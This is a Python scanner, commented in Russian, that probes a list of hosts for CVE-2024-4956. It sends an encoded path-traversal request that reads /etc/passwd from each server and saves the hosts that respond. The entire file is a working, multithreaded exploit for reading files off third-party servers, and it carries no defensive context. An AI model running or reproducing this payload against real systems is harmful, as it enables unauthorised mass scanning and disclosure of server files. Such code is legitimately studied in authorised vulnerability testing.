
import requests
from concurrent.futures import ThreadPoolExecutor

def check_vulnerability(host, vulnerable_hosts):
    file_path = "/etc/passwd"
    url = f"http://{host}/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../{file_path}"
    
    try:
        response = requests.get(url, timeout=5, verify=False) # формирование запроса
        
        if response.status_code == 200: # код 200 - имеется уязвимость
            print(f"[+] CVE-2024-4956 on {host} || {file_path} available")
            vulnerable_hosts.append(host)
        else:
            print(f"[-] Not found on {host} || Response code: {response.status_code}")
    except requests.exceptions.Timeout: # проверка на тайм аут
        print(f"[!] Timeout with {host}")
    except Exception as e:
        print(f"[!] Error with {host}: {e}")

def main():
    file_path = input("File with target hosts path: ")
    output_file = input("Output file path: ")
    vulnerable_hosts = []
    
    try:
        with open(file_path, 'r') as file:
            hosts = [line.strip() for line in file.readlines()]
        
        with ThreadPoolExecutor(max_workers=10) as executor: # попытка в многопоточность
            executor.map(lambda host: check_vulnerability(host, vulnerable_hosts), hosts)
        
        with open(output_file, 'w') as file:
            for host in vulnerable_hosts:
                file.write(f"{host}\n")
        
        print(f"[+] Saved in {output_file}")
    except Exception as e:
        print(f"[!] Error with reading file: {e}")

if __name__ == "__main__":
    main()
